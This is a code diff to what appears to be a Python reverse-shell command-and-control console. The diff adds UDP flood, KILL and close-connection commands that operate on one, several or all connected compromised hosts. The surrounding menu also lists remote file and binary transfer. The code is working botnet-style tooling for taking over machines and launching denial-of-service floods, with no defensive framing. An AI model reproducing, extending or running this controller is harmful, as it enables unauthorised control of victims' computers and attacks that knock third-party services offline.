@@ -123,6 +123,7 @@ def list_connected_commands():
     print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
     print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
     print ("$UDP_Flood targetIP targetPort (msg) -> Selected Host floods target")
+    print ("$KILL -> All selected Hosts stop current perpetual task")
     print ("$Close_Connection -> Close Connection and remove host")
     print ("$Exit -> Exit to the main interface")
 
@@ -132,8 +133,9 @@ def list_connected_mult_commands():
     print ("$List_Sel_Hosts -> Display selected hosts")
     print ("$Make_File localFileName (remoteFileName)-> Create remote file")
     print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
-    print ("$UDP_Flood targetIP targetPort (msg) -> ALL Hosts flood target")
-    print ("$KILL -> ALL Hosts stop current perpetual task")
+    print ("$UDP_Flood targetIP targetPort (msg) -> All selected Hosts flood target")
+    print ("$KILL -> All selected Hosts stop current perpetual task")
+    print ("$Close_Connection -> close connection with and remove all selected hosts")
     print ("$Exit -> Exit to the main interface")
 
 class rev_shell_client_main():
@@ -312,6 +314,23 @@ while True:
                     decode = recv_comm(int(decode),cur_host_con)
                     localBin.write(decode)
                     localBin.close()
+            elif comm_body == "UDP_Flood":
+                try:
+                    targetIP = command[1]
+                    targetPort = int(command[2])
+                except:
+                    print ("Target IP or port not provided or bad formating")
+                    continue
+                try:
+                    msg = command[3]
+                except:
+                    msg = "Hello"
+                UDP_Flood(targetIP,targetPort,msg,cur_host_con,cur_host_id)
+                print("Started UDP Flood to "+targetIP+" on port "+str(targetPort)+" use $KILL to stop it.")
+            elif comm_body == "KILL":
+                res = send_comm('KILL',cur_host_con)
+                if res == 1:
+                    pass
             elif comm_body == "Close_Connection":
                 cur_host_con.close()
                 handler.remove_host(cur_host_id)
@@ -421,6 +440,14 @@ while True:
                     res = send_comm('KILL',active_hosts[host_at_hand][0])
                     if res == 1:
                         pass
+            elif comm_body == "Close_Connection":
+                jobs = []
+                active_hosts = handler.return_list_of_hosts()
+                for j in range(len(list_of_selected_hosts)-1,-1,-1):
+                    host_at_hand = list_of_selected_hosts[j]
+                    active_hosts[host_at_hand][0].close()
+                    handler.remove_host(host_at_hand)
+                break
             elif comm_body == "Exit":
                 break
     elif translated == 4:
@@ -518,6 +545,16 @@ while True:
                     res = send_comm('KILL',host_at_hand[0])
                     if res == 1:
                         pass
+            elif comm_body == "Close_Connection":
+                active_hosts = handler.return_list_of_hosts()
+                list_of_selected_hosts = []
+                for host_ID in range(len(active_hosts)):
+                    list_of_selected_hosts.append(host_ID)
+                for j in range(len(list_of_selected_hosts)-1,-1,-1):
+                    host_at_hand = list_of_selected_hosts[j]
+                    active_hosts[host_at_hand][0].close()
+                    handler.remove_host(host_at_hand)
+                break
             elif comm_body == "Exit":
                 break
     elif translated == 5:
